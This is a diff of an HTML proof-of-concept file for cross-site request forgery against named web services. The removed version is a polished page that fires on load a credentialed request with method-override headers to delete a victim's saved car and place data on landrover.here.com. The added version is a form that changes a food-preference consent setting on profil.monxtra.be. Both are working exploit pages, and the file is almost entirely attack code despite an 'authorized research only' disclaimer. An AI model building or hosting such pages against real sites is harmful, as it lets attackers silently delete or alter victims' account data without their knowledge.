@@ -1,175 +1,21 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>CSRF PoC - landrover.here.com</title>
-  <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-
-    body {
-      font-family: 'Segoe UI', Arial, sans-serif;
-      background: #1a1a2e;
-      color: #eee;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-    }
-
-    .card {
-      background: #16213e;
-      border: 1px solid #0f3460;
-      border-radius: 12px;
-      padding: 40px;
-      max-width: 600px;
-      width: 90%;
-      box-shadow: 0 8px 32px rgba(0,0,0,0.4);
-    }
-
-    .badge {
-      display: inline-block;
-      background: #e94560;
-      color: white;
-      font-size: 11px;
-      font-weight: bold;
-      padding: 3px 10px;
-      border-radius: 20px;
-      letter-spacing: 1px;
-      margin-bottom: 16px;
-    }
-
-    h1 { font-size: 22px; margin-bottom: 8px; color: #fff; }
-
-    .subtitle { font-size: 13px; color: #aaa; margin-bottom: 24px; }
-
-    .info-table {
-      width: 100%;
-      border-collapse: collapse;
-      margin-bottom: 24px;
-      font-size: 13px;
-    }
-
-    .info-table td { padding: 8px 10px; border-bottom: 1px solid #0f3460; }
-    .info-table td:first-child { color: #aaa; width: 140px; }
-    .info-table td:last-child { color: #e2e2e2; font-family: monospace; word-break: break-all; }
-
-    .status-box {
-      background: #0f3460;
-      border-radius: 8px;
-      padding: 14px 18px;
-      font-size: 13px;
-      margin-bottom: 20px;
-      min-height: 48px;
-      color: #ccc;
-    }
-
-    .status-box.success { border-left: 4px solid #4caf50; }
-    .status-box.error   { border-left: 4px solid #e94560; }
-    .status-box.pending { border-left: 4px solid #f0a500; }
-
-    button {
-      background: #e94560;
-      color: white;
-      border: none;
-      padding: 11px 28px;
-      border-radius: 6px;
-      font-size: 14px;
-      cursor: pointer;
-      transition: background 0.2s;
-    }
-
-    button:hover { background: #c73652; }
-
-    .note { margin-top: 20px; font-size: 11px; color: #666; line-height: 1.6; }
-
-    code {
-      background: #0f3460;
-      padding: 1px 6px;
-      border-radius: 3px;
-      font-size: 12px;
-      color: #e2e2e2;
-    }
-  </style>
+  <title>CSRF PoC - Food Preference Consent</title>
 </head>
 <body>
+  <h2>CSRF PoC</h2>
 
-<div class="card">
-  <div class="badge">CSRF POC</div>
-  <h1>landrover.here.com</h1>
-  <p class="subtitle">Cross-Site Request Forgery — DELETE myCarPlace via POST Method Override</p>
+  <form action="https://profil.monxtra.be/manage-profile/food-preferences/consents/manage?code=PREF_CELERY_NEW&category=CAT_ALLERGY&_data=routes%2Fmanage-profile%2B%2Ffood-preferences%2B%2Fconsents.manage%2Findex"
+        method="POST"
+        enctype="application/x-www-form-urlencoded">
 
-  <table class="info-table">
-    <tr><td>Target</td>     <td>https://landrover.here.com/api/v1/scbe</td></tr>
-    <tr><td>Method</td>     <td>POST</td></tr>
-    <tr><td>Override</td>   <td>X_request_method: DELETE</td></tr>
-    <tr><td>Endpoint</td>   <td>X_endpoint: userData/myCarPlace?</td></tr>
-    <tr><td>Auth</td>       <td>AWSALB + AWSALBCORS cookies (auto-sent)</td></tr>
-    <tr><td>CSRF Token</td> <td>None — not required by server</td></tr>
-    <tr><td>Impact</td>     <td>Deletes victim's saved car/place data silently</td></tr>
-    <tr><td>Severity</td>   <td>High — CVSS 8.1</td></tr>
-  </table>
+    <input type="hidden"
+           name="acceptedConsents"
+           value="X_CS_LIFESTYLE_AND_ALLERGEN_PRODUCTINFO">
 
-  <div class="status-box pending" id="statusBox">
-    ⏳ Waiting to trigger...
-  </div>
-
-  <button onclick="triggerCSRF()">▶ Trigger CSRF Manually</button>
-
-  <p class="note">
-    ⚠️ <strong>For authorized security research only.</strong><br>
-    The request auto-fires on page load. Cookies are attached automatically by the victim's browser
-    via <code>credentials: 'include'</code>. A CORS error in the console is expected —
-    the server still processes the request server-side.
-  </p>
-</div>
-
-<script>
-  function setStatus(msg, type) {
-    const box = document.getElementById('statusBox');
-    box.className = 'status-box ' + type;
-    box.innerHTML = msg;
-  }
-
-  function triggerCSRF() {
-    setStatus('⏳ Sending CSRF request to target...', 'pending');
-
-    fetch('https://landrover.here.com/api/v1/scbe', {
-      method: 'POST',
-      credentials: 'include',
-      headers: {
-        'Content-Type':     'application/json',
-        'X_endpoint':       'userData/myCarPlace?',
-        'X_content-Type':   'application/json; encoding:utf-8',
-        'X_request_method': 'DELETE',
-        'Accept':           'application/json',
-        'Referer':          'https://landrover.here.com/index.php?deeplink=myaccount'
-      },
-      body: null
-    })
-    .then(response => {
-      setStatus(
-        `✅ Response received: <code>HTTP ${response.status} ${response.statusText}</code><br>
-         Request was processed by the server with victim's session.`,
-        'success'
-      );
-      return response.text();
-    })
-    .catch(err => {
-      setStatus(
-        `⚠️ CORS blocked the response (expected behavior).<br>
-         The request was <strong>still sent and processed</strong> by the server with victim cookies.<br>
-         Check server logs or victim account to confirm deletion.`,
-        'error'
-      );
-    });
-  }
-
-  // Auto-trigger on page load
-  window.onload = function () {
-    setTimeout(triggerCSRF, 800);
-  };
-</script>
+    <input type="submit" value="Submit CSRF Request">
+  </form>
 
 </body>
 </html>
